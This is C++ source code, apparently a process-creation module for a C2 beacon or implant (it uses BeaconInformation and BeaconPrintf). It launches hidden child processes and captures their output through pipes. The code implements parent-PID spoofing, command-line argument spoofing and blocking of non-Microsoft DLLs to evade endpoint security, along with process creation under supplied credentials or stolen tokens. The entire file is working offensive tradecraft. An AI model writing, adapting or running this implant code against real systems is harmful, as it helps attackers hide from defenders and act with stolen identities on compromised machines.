#include <general.h>
#include <externs.h>

#define PIPE_READ_TIMEOUT_MS  10000
#define PIPE_POLL_INTERVAL_MS 100

#ifndef MIN
#define MIN(a, b) (((a) < (b)) ? (a) : (b))
#endif

auto read_pipe_output(
    _In_      HANDLE  pipe_read,
    _In_      HANDLE  process_handle,
    _Out_opt_ PBYTE*  out_buffer,
    _Out_opt_ ULONG*  out_length
) -> NTSTATUS {
    DbgPrint( "[read_pipe_output] Starting pipe read loop\n" );

    // Inicializar outputs
    if ( out_buffer ) *out_buffer = nullptr;
    if ( out_length ) *out_length = 0;

    DWORD  total_elapsed   = 0;
    DWORD  bytes_available = 0;
    DWORD  bytes_read      = 0;
    BYTE   read_buffer[4096];
    BOOL   process_exited  = FALSE;

    SIZE_T output_capacity = 0x10000;
    SIZE_T output_size     = 0;
    PBYTE  output_buffer   = (PBYTE)malloc( output_capacity );

    if ( !output_buffer ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to allocate output buffer" );
        return STATUS_NO_MEMORY;
    }

    while ( total_elapsed < PIPE_READ_TIMEOUT_MS ) {
        DWORD wait_result = WaitForSingleObject( process_handle, 0 );
        if ( wait_result == WAIT_OBJECT_0 ) {
            if ( !process_exited ) {
            }
            process_exited = TRUE;
        }

        bytes_available = 0;
        BOOL peek_result = PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr );

        if ( !peek_result ) {
            DWORD peek_error = GetLastError();

            if ( peek_error == ERROR_BROKEN_PIPE ) {
                break;
            }
        }

        if ( bytes_available > 0 ) {
            while ( bytes_available > 0 ) {
                DWORD to_read = MIN( bytes_available, (DWORD)sizeof(read_buffer) );
                bytes_read = 0;

                if ( !ReadFile( pipe_read, read_buffer, to_read, &bytes_read, nullptr ) ) {
                    break;
                }

                if ( bytes_read == 0 ) {
                    break;
                }

                while ( output_size + bytes_read > output_capacity ) {
                    SIZE_T new_capacity = output_capacity * 2;

                    PBYTE new_buffer = (PBYTE)realloc( output_buffer, new_capacity );

                    if ( !new_buffer ) {
                        if ( out_buffer && out_length ) {
                            *out_buffer = output_buffer;
                            *out_length = (ULONG)output_size;
                        } else {
                            free( output_buffer );
                        }
                        return STATUS_NO_MEMORY;
                    }

                    output_buffer   = new_buffer;
                    output_capacity = new_capacity;
                }

                memcpy( output_buffer + output_size, read_buffer, bytes_read );
                output_size += bytes_read;

                bytes_available -= bytes_read;
            }

            total_elapsed = 0;
        } else {
            if ( process_exited ) {
                WaitForSingleObject( nt_current_process(), 50 );

                if ( PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr ) && bytes_available == 0 ) {
                    DbgPrint( "[read_pipe_output] No more data - done\n" );
                    break;
                }
            } else {
                WaitForSingleObject( nt_current_process(), PIPE_POLL_INTERVAL_MS );
                total_elapsed += PIPE_POLL_INTERVAL_MS;
            }
        }
    }

    if ( output_size > 0 ) {
        if ( output_size >= output_capacity ) {
            PBYTE new_buffer = (PBYTE)realloc( output_buffer, output_size + 1 );
            if ( new_buffer ) {
                output_buffer = new_buffer;
            }
        }
        output_buffer[output_size] = '\0';

        if ( out_buffer && out_length ) {
            *out_buffer = output_buffer;
            *out_length = (ULONG)output_size;
        } else {
            free( output_buffer );
        }
    } else {
        free( output_buffer );
    }

    return STATUS_SUCCESS;
}

extern "C" auto kh_process_creation( 
    _In_      PS_CREATE_ARGS*      create_args,
    _Out_opt_ PROCESS_INFORMATION* ps_information,
    _Out_opt_ PBYTE*               output_ptr,
    _Out_opt_ ULONG*               output_len
) -> ULONG {
    DbgPrint( "[kh_process_creation] Function entry\n" );
    
    if ( output_ptr ) *output_ptr = nullptr;
    if ( output_len ) *output_len = 0;

    BEACON_INFO* info = (BEACON_INFO*)malloc( sizeof( BEACON_INFO ) );
    DbgPrint( "[kh_process_creation] Allocated BEACON_INFO at %p\n", info );

    BeaconInformation( info );
    DbgPrint( "[kh_process_creation] Retrieved beacon information\n" );

    create_args->ppid      = info->Config->Ps.ParentID;
    create_args->blockdlls = info->Config->Ps.BlockDlls;
    create_args->spoofarg  = info->Config->Ps.SpoofArg;

    DbgPrint( "[kh_process_creation] Config: ppid=%d, blockdlls=%d, spoofarg=%d\n", 
              create_args->ppid, create_args->blockdlls, create_args->spoofarg );

    auto process_cmdline = (create_args->spoofarg ? create_args->spoofarg : create_args->argument);
    DbgPrint( "[kh_process_creation] Process cmdline: %ls\n", process_cmdline );
    
    auto process_info    = PROCESS_INFORMATION{ 0 };
    auto startup_info_ex = STARTUPINFOEXW{ 0 };
    auto startup_info    = STARTUPINFOW{ 0 };
    auto security_attr   = SECURITY_ATTRIBUTES{ sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };

    auto process_flags   = DWORD{ CREATE_NO_WINDOW };
    auto process_policy  = UINT_PTR{ 0 };

    auto pipe_read      = HANDLE{ nullptr };
    auto pipe_write     = HANDLE{ nullptr };
    auto pipe_duplicate = HANDLE{ nullptr };
    auto parent_handle  = HANDLE{ nullptr };

    auto attribute_buff = PVOID{ nullptr };
    auto attribute_size = SIZE_T{ 0 };

    auto update_attr_count = 0;
    auto use_extended_info = FALSE;

    ULONG error_code = ERROR_SUCCESS;
    BOOL  success    = FALSE;

    auto cleanup = [&]( NTSTATUS ret_status ) -> NTSTATUS {
        DbgPrint( "[cleanup] Cleaning up resources, status=%08X\n", ret_status );

        if ( attribute_buff ) {
            DeleteProcThreadAttributeList( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff );
            free( attribute_buff );
            DbgPrint( "[cleanup] Freed attribute buffer\n" );
        }

        if ( pipe_read     ) { CloseHandle( pipe_read     ); DbgPrint( "[cleanup] Closed pipe_read\n"     ); }
        if ( pipe_write    ) { CloseHandle( pipe_write    ); DbgPrint( "[cleanup] Closed pipe_write\n"    ); }
        if ( parent_handle ) { CloseHandle( parent_handle ); DbgPrint( "[cleanup] Closed parent_handle\n" ); }

        return ret_status;
    };

    use_extended_info = ( create_args->method == Create::Default );
    DbgPrint( "[kh_process_creation] Creation method=%d, use_extended_info=%d\n", 
              create_args->method, use_extended_info );

    if ( use_extended_info ) {
        if ( create_args->ppid      ) update_attr_count++;
        if ( create_args->blockdlls ) update_attr_count++;
        DbgPrint( "[kh_process_creation] Attribute count: %d\n", update_attr_count );
    }

    if ( update_attr_count > 0 ) {
        InitializeProcThreadAttributeList( nullptr, update_attr_count, 0, &attribute_size );
        DbgPrint( "[kh_process_creation] Required attribute size: %zu bytes\n", attribute_size );
        
        attribute_buff = malloc( attribute_size );
        if ( !attribute_buff ) {
            error_code = GetLastError();
            DbgPrint( "[kh_process_creation] ERROR: Failed to allocate attribute buffer\n" );
            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate attribute buffer" );
            return cleanup( STATUS_NO_MEMORY );
        }
        DbgPrint( "[kh_process_creation] Allocated attribute buffer at %p\n", attribute_buff );

        if ( !InitializeProcThreadAttributeList( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, update_attr_count, 0, &attribute_size ) ) {
            error_code = GetLastError();
            DbgPrint( "[kh_process_creation] ERROR: Failed to initialize attribute list, error=%d\n", error_code );
            BeaconPrintf( CALLBACK_ERROR, "Failed to initialize attribute list: (%d) %ls", error_code, fmt_error( error_code ) );
            return cleanup( STATUS_UNSUCCESSFUL );
        }
        DbgPrint( "[kh_process_creation] Initialized attribute list successfully\n" );
    }

    if ( use_extended_info && create_args->ppid ) {
        DbgPrint( "[kh_process_creation] Opening parent process with PID=%d\n", create_args->ppid );
        
        parent_handle = OpenProcess( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, create_args->ppid );
        if ( ! parent_handle ) {
            error_code = GetLastError();
            DbgPrint( "[kh_process_creation] ERROR: Failed to open parent process, error=%d\n", error_code );
            BeaconPrintf( CALLBACK_ERROR, "Failed to open parent process %d: (%d) %ls", create_args->ppid, error_code, fmt_error( error_code ) );
            return cleanup( error_code );
        }
        DbgPrint( "[kh_process_creation] Opened parent process handle=%p\n", parent_handle );

        if ( ! UpdateProcThreadAttribute( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent_handle, sizeof(HANDLE), nullptr, nullptr ) ) {
            error_code = GetLastError();
            DbgPrint( "[kh_process_creation] ERROR: Failed to update parent process attribute, error=%d\n", error_code );
            BeaconPrintf( CALLBACK_ERROR, "Failed to update parent process attribute: (%d) %ls", error_code, fmt_error( error_code ) );
            return cleanup( error_code );
        }
        DbgPrint( "[kh_process_creation] Updated parent process attribute successfully\n" );
    }

    if ( use_extended_info && create_args->blockdlls ) {
        process_policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        DbgPrint( "[kh_process_creation] Setting BlockDlls mitigation policy\n" );
        
        if ( ! UpdateProcThreadAttribute( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &process_policy, sizeof(UINT_PTR), nullptr, nullptr ) ) {
            error_code = GetLastError();
            DbgPrint( "[kh_process_creation] ERROR: Failed to update mitigation policy, error=%d\n", error_code );
            BeaconPrintf( CALLBACK_ERROR, "Failed to update mitigation policy attribute: (%d) %ls", error_code, fmt_error( error_code ) );
            return cleanup( error_code );
        }
        DbgPrint( "[kh_process_creation] Updated mitigation policy successfully\n" );
    }

    if ( use_extended_info ) {
        DbgPrint( "[kh_process_creation] Configuring extended startup info\n" );
        startup_info_ex.StartupInfo.cb          = sizeof( STARTUPINFOEXW );
        startup_info_ex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
        startup_info_ex.StartupInfo.wShowWindow = SW_HIDE;
        
        if ( attribute_buff ) {
            startup_info_ex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff;
            process_flags |= EXTENDED_STARTUPINFO_PRESENT;
            DbgPrint( "[kh_process_creation] Added EXTENDED_STARTUPINFO_PRESENT flag\n" );
        }
    } else {
        DbgPrint( "[kh_process_creation] Configuring standard startup info\n" );
        startup_info.cb          = sizeof( STARTUPINFOW );
        startup_info.dwFlags     = STARTF_USESHOWWINDOW;
        startup_info.wShowWindow = SW_HIDE;
    }

    if ( create_args->pipe ) {
        DbgPrint( "[kh_process_creation] Creating pipe for output capture\n" );
        
        if ( ! CreatePipe( &pipe_read, &pipe_write, &security_attr, 0 ) ) {
            error_code = GetLastError();
            DbgPrint( "[kh_process_creation] ERROR: Failed to create pipe, error=%d\n", error_code );
            BeaconPrintf( CALLBACK_ERROR, "Failed to create pipe: (%d) %ls", error_code, fmt_error( error_code ) );
            return cleanup( error_code );
        }
        DbgPrint( "[kh_process_creation] Created pipe: read=%p, write=%p\n", pipe_read, pipe_write );

        SetHandleInformation( pipe_read, HANDLE_FLAG_INHERIT, 0 );
        DbgPrint( "[kh_process_creation] Set pipe_read as non-inheritable\n" );

        if ( use_extended_info && create_args->ppid && parent_handle ) {
            DbgPrint( "[kh_process_creation] Duplicating pipe write handle to parent process\n" );
            
            if ( !DuplicateHandle( nt_current_process(), pipe_write, parent_handle, &pipe_duplicate, 0, TRUE, DUPLICATE_SAME_ACCESS ) ) {
                error_code = GetLastError();
                DbgPrint( "[kh_process_creation] ERROR: Failed to duplicate pipe handle, error=%d\n", error_code );
                BeaconPrintf( CALLBACK_ERROR, "Failed to duplicate pipe handle: (%d) %ls", error_code, fmt_error( error_code ) );
                return cleanup( error_code );
            }
            DbgPrint( "[kh_process_creation] Duplicated pipe handle=%p\n", pipe_duplicate );

            CloseHandle( pipe_write );
            pipe_write = pipe_duplicate;
            DbgPrint( "[kh_process_creation] Replaced pipe_write with duplicated handle\n" );
        }

        if ( use_extended_info ) {
            startup_info_ex.StartupInfo.dwFlags    |= STARTF_USESTDHANDLES;
            startup_info_ex.StartupInfo.hStdError   = pipe_write;
            startup_info_ex.StartupInfo.hStdOutput  = pipe_write;
            startup_info_ex.StartupInfo.hStdInput   = GetStdHandle( STD_INPUT_HANDLE );
            DbgPrint( "[kh_process_creation] Configured extended startup info with pipe handles\n" );
        } else {
            startup_info.dwFlags    |= STARTF_USESTDHANDLES;
            startup_info.hStdError   = pipe_write;
            startup_info.hStdOutput  = pipe_write;
            startup_info.hStdInput   = GetStdHandle( STD_INPUT_HANDLE );
            DbgPrint( "[kh_process_creation] Configured standard startup info with pipe handles\n" );
        }
    }

    DbgPrint( "[kh_process_creation] Creating process with method=%d\n", create_args->method );

    switch ( create_args->method ) {
        case Create::Default: {
            DbgPrint( "[kh_process_creation] Calling CreateProcessW\n" );
            success = CreateProcessW(
                nullptr, process_cmdline, nullptr, nullptr, TRUE, process_flags, 
                nullptr, nullptr, &startup_info_ex.StartupInfo, &process_info
            );
            break;
        }

        case Create::WithLogon: {
            DbgPrint( "[kh_process_creation] Calling CreateProcessWithLogonW (user=%ls, domain=%ls)\n", 
                      create_args->username, create_args->domain );
            success = CreateProcessWithLogonW(
                create_args->username, create_args->domain, create_args->password, LOGON_WITH_PROFILE,
                nullptr, process_cmdline, CREATE_NO_WINDOW, nullptr, nullptr, &startup_info, &process_info
            );
            break;
        }

        case Create::WithToken: {
            DbgPrint( "[kh_process_creation] Calling CreateProcessWithTokenW (token=%p)\n", create_args->token );
            success = CreateProcessWithTokenW(
                create_args->token, LOGON_WITH_PROFILE, nullptr, process_cmdline, 
                CREATE_NO_WINDOW, nullptr, nullptr, &startup_info, &process_info 
            );
            break;
        }

        default: {
            DbgPrint( "[kh_process_creation] ERROR: Unknown creation method=%d\n", create_args->method );
            BeaconPrintf( CALLBACK_ERROR, "Unknown process creation method: %d", create_args->method );
            return cleanup( STATUS_INVALID_PARAMETER );
        }
    }

    if ( ! success ) {
        error_code = GetLastError();
        DbgPrint( "[kh_process_creation] ERROR: Process creation failed, error=%d\n", error_code );
        BeaconPrintf( CALLBACK_ERROR, "Failed to create process with error: (%d) %ls", error_code, fmt_error( error_code ) );
        return cleanup( error_code );
    }

    DbgPrint( "[kh_process_creation] Process created successfully: PID=%d, TID=%d, hProcess=%p, hThread=%p\n",
              process_info.dwProcessId, process_info.dwThreadId, 
              process_info.hProcess, process_info.hThread );

    if ( pipe_write ) {
        CloseHandle( pipe_write );
        pipe_write = nullptr;
        DbgPrint( "[kh_process_creation] Closed pipe_write after process creation\n" );
    }

    if ( create_args->pipe && pipe_read ) {
        DbgPrint( "[kh_process_creation] Reading pipe output\n" );
        
        PBYTE  pipe_output = nullptr;
        ULONG  pipe_length = 0;

        NTSTATUS read_status = read_pipe_output( pipe_read, process_info.hProcess, &pipe_output, &pipe_length );

        if ( nt_success(read_status) && pipe_output && pipe_length > 0 ) {
            DbgPrint( "[kh_process_creation] Successfully read %d bytes from pipe\n", pipe_length );
            
            if ( output_ptr && output_len ) {
                *output_ptr = pipe_output;
                *output_len = pipe_length;
                DbgPrint( "[kh_process_creation] Output assigned to caller\n" );
            } else {
                free( pipe_output );
                DbgPrint( "[kh_process_creation] Freed pipe output (no output buffer provided)\n" );
            }
        } else {
            DbgPrint( "[kh_process_creation] Failed to read pipe output, status=%08X\n", read_status );
        }
    }

    if ( ps_information ) {
        *ps_information = process_info;
        DbgPrint( "[kh_process_creation] Process information returned to caller\n" );
    } else {
        if ( process_info.hProcess ) CloseHandle( process_info.hProcess );
        if ( process_info.hThread  ) CloseHandle( process_info.hThread  );
        DbgPrint( "[kh_process_creation] Closed process/thread handles (no ps_information buffer)\n" );
    }

    DbgPrint( "[kh_process_creation] Function exit with STATUS_SUCCESS\n" );
    return cleanup( STATUS_SUCCESS );
}